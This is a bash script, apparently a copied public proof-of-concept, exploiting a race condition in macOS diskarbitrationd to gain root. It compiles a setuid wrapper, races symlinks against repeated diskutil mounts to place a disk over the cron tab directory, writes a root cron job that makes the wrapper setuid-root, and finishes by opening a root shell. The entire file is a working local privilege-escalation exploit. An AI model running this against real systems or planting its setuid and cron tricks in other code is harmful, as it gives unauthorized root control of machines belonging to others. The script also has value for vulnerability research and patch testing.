#!/bin/bash

# Sources: 
# https://raw.githubusercontent.com/phoenhex/files/master/pocs/poc-mount.sh
# https://phoenhex.re/2017-06-09/pwn2own-diskarbitrationd-privesc

if ! security authorize system.volume.internal.mount &>/dev/null; then
  echo 2>&1 "Cannot acquire system.volume.internal.mount right. This will not work."
  exit 1
fi

TARGET=/private/var/at
SUBDIR=tabs
DISK=/dev/disk0s1

TMPDIR=/tmp/pwn
mkdir -p $TMPDIR
cd $TMPDIR

cat << EOF > boom.c
#include <assert.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc, char ** argv) {
  assert(argc == 2);
  setuid(0);
  setgid(0);
  system(argv[1]);
}
EOF
clang boom.c -o _boom || exit 1

race_link() {
  mkdir -p mounts

  while true; do
    ln -snf mounts link
    ln -snf $TARGET link
  done
}

race_mount() {
  while ! df -h | grep $TARGET >/dev/null; do
    while df -h | grep $DISK >/dev/null; do
      diskutil umount $DISK &>/dev/null
    done
    while ! df -h | grep $DISK >/dev/null; do
      diskutil mount -mountPoint $TMPDIR/link/$SUBDIR $DISK &>/dev/null
    done
  done
}

cleanup() {
  echo "Killing child process $PID and cleaning up tmp dir"
  kill -9 $PID
  rm -rf $TMPDIR
}

if df -h | grep $DISK >/dev/null; then
  echo 2>&1 "$DISK already mounted. Exiting."
  exit 1
fi

race_link &
PID=$!
trap cleanup EXIT
echo "Just imagine having that root shell. It's gonna be legen..."
race_mount

echo "wait for it..."
CMD="cp $TMPDIR/_boom $TMPDIR/boom; chmod u+s $TMPDIR/boom"
rm -f /var/at/tabs/root
echo "* * * * *" "$CMD" > /var/at/tabs/root

while ! [ -e $TMPDIR/boom ]; do
  sleep 1
done

echo "dary!"
kill -9 $PID
sleep 0.1
$TMPDIR/boom "rm /var/at/tabs/root"
$TMPDIR/boom "umount -f $DISK"
$TMPDIR/boom "rm -rf $TMPDIR; cd /; su"